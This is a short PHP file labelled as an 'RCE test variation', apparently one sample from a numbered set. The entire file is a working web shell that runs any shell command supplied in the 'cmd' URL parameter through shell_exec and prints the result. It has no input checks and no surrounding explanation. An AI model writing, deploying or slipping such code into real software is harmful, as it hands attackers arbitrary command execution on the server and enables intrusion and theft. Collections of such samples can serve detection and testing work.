<?php
// RCE test variation #1304
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>